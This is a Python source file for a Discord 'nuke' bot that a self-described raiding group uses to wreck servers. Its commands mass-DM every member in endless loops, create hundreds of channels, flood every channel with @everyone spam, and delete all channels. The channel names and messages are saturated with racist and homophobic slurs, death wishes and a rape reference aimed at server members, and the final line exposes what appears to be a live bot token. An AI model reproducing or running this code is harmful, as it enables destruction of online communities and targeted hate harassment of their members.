#GS nigger slayer
#GS GACHA SLAYER
#By: 〔ᏀᎦ〕[UЖ] ★Joકh#0690

import discord
from discord.ext import commands
from discord import Permissions
import string
import random
from colorama import Fore, Style
from discord_webhook import DiscordWebhook, DiscordEmbed
import asyncio
import os
client = commands.Bot(
    command_prefix='$',
    case_insensitive=True
)

###############################################################################BOT SHIT#########################
########################################################

CHANNEL_NAMES = ["Niggered","Gullible","Fags","Nuked by GS","Owned lmfao","Shit on","Hoes be mad","Stinky","UTTP WILL RISE","GS JoSh has just won","crusty ass","stinky","uh oh","another one bites da dust","we own your crusty ass","owned hard","gays are haram","say goodbye to your server","monke","niggas in my butthole","maybe you was dropped wen baby","Nuked by GS","Faggots","this our hive now","niggered hard","Nuked by JoSh and gs","big ded","get monke'd on","GS FTW"]

print(f"""
{Fore.GREEN}
|GL bot Ready To KILL|
{Style.RESET_ALL}           
          Made by JoSh               
""")
print(f"""
{Fore.WHITE}
The Bot Is Online
{Fore.BLUE}
Prefix is "$"
{Fore.YELLOW}
|JoSh|
{Style.RESET_ALL}
""")

@client.event
async def on_ready():
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, name="Gachas Getting slayed"))

@client.command()
async def bru(ctx, *, message):
  await ctx.message.delete()
  guild = ctx.guild
  while True:    
    for member in guild.members:
        try:
            await member.send(message)
        except:
            pass

@client.command(pass_context=True)
async def chcreate(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  for i in range(500):
    await guild.create_text_channel(random.choice(CHANNEL_NAMES))
    for channel in list(ctx.message.guild.channels):
      print (channel.name + "Damn bro so cruel")

@client.command()
async def skrt(ctx):
  guild = ctx.message.guild
  await ctx.message.delete()
  print ("")
  print ("Ight Flooding chat starts now")
  while True:
    for channel in guild.text_channels:
      await channel.send("@everyone GS Owned your bitch ass")

@client.command(pass_context=True)
async def ez(ctx):
    guild = ctx.message.guild  
    await ctx.message.delete()   
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(channel.name + " yeah ok bro")
        except:
            pass
    channel = await guild.create_text_channel('i hope you die in a fire!')
    await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png")
    channel = await guild.create_text_channel('hope you get stabbed in the heart')
    await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png")
    channel = await guild.create_text_channel('hope you get shot and expire!')
    await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png")
    channel = await guild.create_text_channel('oh this is what you desire!')
    await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png")
    channel = await guild.create_text_channel('vibin')
    await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png")
    channel = await guild.create_text_channel('fr tho')
    await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png")
    channel = await guild.create_text_channel('dont fuck wit us')
    await channel.send("@everyone gacha and gays haram")
    for member in guild.members:
        await asyncio.sleep(0)
        try:
            await member.send(
                "so you just got raped by GS um ok so like we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png"
            )
        except:
            pass  
            print("") 
            print("ez")  
    while True:
      for i in range(500):
        await guild.create_text_channel(random.choice(CHANNEL_NAMES))
        for channel in list(ctx.message.guild.channels):
          print (channel.name + " damn another server down, this is too ez")      
        await channel.send("@everyone we are stronk https://cdn.discordapp.com/attachments/747322008936906822/747323561697345556/2Q.png") 



#holy fucking shit after 2 hours of trail and error i am finally done 

client.run(os.environ['NzQ3MzExMjk0NDc4MTU1ODE2.X0NB4A.YluKI1ZAtmgymtLRMuz3ZfGACUw'])